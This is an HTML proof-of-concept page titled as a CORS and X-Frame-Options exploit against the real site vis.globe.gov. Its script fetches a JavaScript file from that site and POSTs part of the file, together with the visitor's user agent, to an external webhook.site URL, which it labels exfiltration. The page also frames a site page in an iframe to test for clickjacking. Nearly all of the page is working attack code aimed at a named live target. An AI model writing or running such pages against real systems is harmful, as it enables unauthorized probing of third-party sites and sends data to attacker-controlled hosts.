<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>GLOBE.gov CORS + XFO Exploit</title>
</head>
<body>
<h2>üß™ Testing vis.globe.gov Vulnerabilities...</h2>
<pre id="log">Loading...</pre>

<script>
function log(msg) {
  document.getElementById("log").textContent += "\n" + msg;
  console.log(msg);
}

(async () => {
  try {
    const js1 = await fetch("https://vis.globe.gov/GLOBE/javascript/VISmain.js");
    log("VISmain.js status: " + js1.status);
    const text1 = await js1.text();

    await fetch("https://webhook.site/29f5b779-2540-4657-a365-bc504ee5c1de", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        file: "VISmain.js",
        content: text1.slice(0, 1000),
        userAgent: navigator.userAgent,
        ts: new Date().toISOString()
      })
    });

    log("‚úÖ JS file exfiltrated to webhook!");
  } catch (e) {
    log("‚ùå Error: " + e.message);
  }
})();
</script>

<!-- Test iframe injection -->
<iframe src="https://vis.globe.gov/GLOBE/popUpContents.jsp" width="600" height="400" style="border:2px solid red;"></iframe>
</body>
</html>
